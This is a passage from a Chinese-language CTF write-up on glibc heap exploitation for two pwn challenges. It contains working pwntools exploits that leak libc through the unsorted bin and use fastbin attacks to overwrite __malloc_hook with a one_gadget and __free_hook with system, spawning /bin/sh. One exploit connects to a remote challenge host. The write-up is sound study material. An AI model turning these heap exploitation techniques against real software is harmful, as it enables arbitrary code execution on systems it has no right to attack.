@@ -1,0 +1,178 @@
+
+```shell
+unsortedbin
+all: 0x916020 —▸ 0x7fb1ba0c3b78 (main_arena+88) ◂— 0x916020
+....
+0x7fb1b9cff000 0x7fb1b9ebf000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so
+```
+
+`0x7fb1a0c3b78`就是泄露出来的地址，`0x7fb1b9cff000`就是libc的装载基地址，可以计算出偏移。
+
+### 修改`fd`，分配到`malloc_hook`附近
+
+```shell
+pwndbg> x/14xg 0x7f85ad672b10-0x40
+0x7f85ad672ad0 <_IO_wide_data_0+272>: 0x0000000000000000 0x0000000000000000
+0x7f85ad672ae0 <_IO_wide_data_0+288>: 0x0000000000000000 0x0000000000000000
+0x7f85ad672af0 <_IO_wide_data_0+304>: 0x00007f85ad671260 0x0000000000000000 <<<---fake_chunk->size
+0x7f85ad672b00 <__memalign_hook>: 0x00007f85ad333e20 0x00007f85ad333a00
+0x7f85ad672b10 <__malloc_hook>: 0x0000000000000000 0x0000000000000000 <<<-----malloc_hook
+0x7f85ad672b20 <main_arena>: 0x0000000000000000 0x0000000000000000
+0x7f85ad672b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000
+```
+
+上面第一个箭头指的地方，`0x7f85ad672af5`这个地址可以作为`fake_chunk`的`size`域。
+
+可得：
+
+```text
+fake_chunk->size = 0x7f85ad672af5
+malloc_hook = 0x7f85ad672b10
+offset = 0x7f85ad672b10 - 0x7f85ad672af5 = 0x1b + 0x10 = 0x2b
+```
+
+最后调用`malloc`触发`onegadget`即可。
+
+## exp
+
+```python
+#-*-coding:utf8-*-
+from pwn import *
+if args['REMOTE']:
+p = remote('e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com',40002)
+else:
+p = process('./pwn')
+elf = ELF('./pwn')
+libc = elf.libc
+def new(content):
+p.sendlineafter('> ','1')
+p.sendlineafter('Your data:',content)
+def show(index):
+p.sendlineafter('> ','2')
+p.sendlineafter('Info index: ',str(index))
+def edit(index,new_content):
+p.sendlineafter('> ','3')
+p.sendlineafter('Info index: ',str(index))
+p.sendline(new_content)
+def delete(index):
+p.sendlineafter('> ','4')
+p.sendlineafter('Info index: ',str(index))
+#通过连续申请两个同样内容的unsorted bin大小的chunk，泄露libc的地址
+def leak_libc():
+new('a'*128) #0
+new('a'*128) #1
+delete(0) #0
+show(1)
+libc_addr = u64(p.recvn(6).ljust(8,'\x00')) - 0x3c4b78
+return libc_addr
+def ow_free_hook(fake_chunk,one_gadget):
+new('b'*0x60) #2
+new('b'*0x60) #3
+delete(2) #2
+payload1 = p64(fake_chunk).ljust(0x60,'\x00')
+edit(3,payload1)
+payload2 = 'a'*(0x13)+p64(one_gadget)
+payload2 = payload2.ljust(0x60,'\x00')
+new('c'*0x60) #4
+new(payload2) #5
+if __name__ == '__main__':
+libc.address = leak_libc()
+log.success(hex(libc.address))
+malloc_hook = libc.symbols['__malloc_hook']
+fake_chunk = malloc_hook - 0x1b -8
+log.success('__malloc_hook : ' + hex(malloc_hook))
+one_gadget = libc.address + 0x4526a
+ow_free_hook(fake_chunk,one_gadget)
+p.sendlineafter('> ','1')
+gdb.attach(p)
+p.interactive()
+```
+
+## 参考资料
+
+类似本题中第一阶段利用 unsorted bin 泄露libc基地址的题：
+
+<a href="elink@2f0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6N6i4y4W2M7Y4y4Q4x3V1k6i4M7X3W2@1k6i4g2H3M7#2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1j5J5x3o6p5%4i4K6u0r3i4K6t1#2c8e0g2Q4x3U0f1^5c8g2)9J5y4f1p5$3i4K6t1#2c8e0W2Q4x3U0f1&6y4#2)9J5y4f1p5^5i4K6t1#2c8e0W2Q4x3U0f1^5x3W2)9J5y4e0R3H3i4K6t1#2c8e0S2Q4x3U0g2m8c8W2)9J5y4f1t1%4i4K6t1#2c8e0S2Q4x3U0g2n7y4g2)9J5y4e0W2n7i4K6u0r3f1s2N6F1i4K6u0r3M7s2N6F1x3W2)9J5c8X3g2^5M7q4)9J5k6i4m8&6"><mark class="encrypted">800K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6N6i4y4W2M7Y4y4Q4x3V1k6i4M7X3W2@1k6i4g2H3M7#2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1j5J5x3o6p5%4i4K6u0r3i4K6t1#2c8e0g2Q4x3U0f1^5c8g2)9J5y4f1p5$3i4K6t1#2c8e0W2Q4x3U0f1&6y4#2)9J5y4f1p5^5i4K6t1#2c8e0W2Q4x3U0f1^5x3W2)9J5y4e0R3H3i4K6t1#2c8e0S2Q4x3U0g2m8c8W2)9J5y4f1t1%4i4K6t1#2c8e0S2Q4x3U0g2n7y4g2)9J5y4e0W2n7i4K6u0r3f1s2N6F1i4K6u0r3M7s2N6F1x3W2)9J5c8X3g2^5M7q4)9J5k6i4m8&6</mark></a>
+
+类似本题中第二阶段 fastbin attack 同样利用方式的题：
+
+[https://bbs.pediy.com/thread-223461.htm](https://bbs.pediy.com/thread-223461.htm)
+
+<a href="elink@35aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4$3N6r3q4G2i4K6u0W2M7s2u0G2i4K6u0r3x3U0l9I4z5q4)9J5c8U0p5I4i4K6u0r3x3e0m8Q4x3V1k6X3j5i4y4@1j5X3W2F1i4K6u0V1j5i4c8@1j5h3y4C8i4K6u0V1x3U0l9I4y4#2)9J5k6o6m8U0N6r3k6Q4x3X3c8T1j5h3u0&6K9r3g2S2M7q4)9J5c8R3`.`."><mark class="encrypted">881K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4$3N6r3q4G2i4K6u0W2M7s2u0G2i4K6u0r3x3U0l9I4z5q4)9J5c8U0p5I4i4K6u0r3x3e0m8Q4x3V1k6X3j5i4y4@1j5X3W2F1i4K6u0V1j5i4c8@1j5h3y4C8i4K6u0V1x3U0l9I4y4#2)9J5k6o6m8U0N6r3k6Q4x3X3c8T1j5h3u0&6K9r3g2S2M7q4)9J5c8R3`.`.</mark></a>
+
+---
+
+# 0x04 daily
+
+## 漏洞点
+
+在`remove`函数里，没有对`index`进行检测，那么如果我们能泄露一个堆的地址，在堆上伪造一个`daily`结构体，使之指向我们想要的地址，结合伪造，就能实现UAF和分配到`.bss`段之类的了。
+
+![](upload/attach/202001/832837\_NY3FGH29QCS8DSX.jpg)
+
+## 泄露堆地址
+
+通过`fastbin`单链表来泄露堆的地址
+
+```python
+def leak_heap():
+new(0x60, 'a') #0 chunk0
+new(0x60, 'a') #1 chunk1
+#new(0x60, 'a') #2 chunk2
+delete(0)
+delete(1) #fastbin->chunk1->chunk0
+new(0x60, 'A') #0 chunk1 fd=chunk0 打印可泄漏堆地址
+show()
+p.recvuntil('0 : A')
+heap_addr = u64(('\x00' + p.recvuntil('=', drop=True)).ljust(8,'\x00'))
+log.success('heap address : ' + hex(heap_addr))
+return heap_addr
+```
+
+## 泄露libc地址
+
+通过`unsorted bin`来泄露libc地址。可以在堆中伪造一个`daily`结构体，其`content`指针指向一个已经存在在真实`daily_list`数组中的地址，计算`index`偏移，将其`delete`，就能够通过打印真实`daily_list`数组中的`content`将`main_arena`的地址泄露出来，即UAF释放后重用的原理
+
+```python
+def leak_libc(heap_addr):
+chunk_list = 0x602060
+fake_content = heap_addr + 0x70 + 0x70 + 0x10 #指向chunk2+0x10
+fake_index = (heap_addr+ 0x10 - chunk_list)/0x10 #
+new(0x60, p64(0x80)+p64(fake_content))#1
+new(0x100, p64(1)) #2 chunk2
+new(0x60, 'a')#3 chunk3
+delete(fake_index) #此时chunk2已在unsorted bin中
+show() #打印泄漏main_arena地址
+p.recvuntil('2 : ')
+leak_addr = u64(p.recvn(6).ljust(8,'\x00'))
+log.success('leak address : ' + hex(leak_addr))
+offset = 0x7f6f0c800b78 - 0x00007f6f0c43c000
+libc.address = leak_addr - offset
+log.success('libc address : ' + hex(libc.address))
+```
+
+## 分配堆到全局变量上，修改`free_hook`
+
+跟刚才一样，通过UAF修改一个`fastbin`中的`chunk`的`fd`指针，使之指向`daily_list`中伪造好`size`的`fake_chunk`，连续分配两次即可分配到`.bss`段的全局变量`daily_list`上，将某个`content`指针覆写成`free_hook`的地址，再使用`change`功能将`free_hook`内容修改成`system`函数装载地址即可
+
+```python
+def fastbin_attack():
+chunk_list = 0x602060
+fake_content = heap_addr + 0x70 + 0x70 + 0x110 +0x10
+fake_index = (heap_addr+ 0x10 - chunk_list)/0x10
+change(1, p64(0x60) + p64(fake_content))
+delete(fake_index)
+free_hook = libc.symbols['__free_hook']
+log.success('free hook : ' + hex(free_hook))
+new(0x71,'a') #4 fake_chunk->size=0x71
+fake_chunk = chunk_list + 0x38
+change(3,p64(fake_chunk)) #chunk3->fd=fake_chunk
+new(0x60, 'a') #5
+new(0x60, p64(free_hook)) #分配到.bss段上 4->content = free_hook
+system = libc.symbols['system']
+change(4, p64(system)) #往free_hook写入system函数地址
+change(0, '/bin/sh')
+delete(0) #触发system('/bin/sh')
+```
+
+## 完整EXP
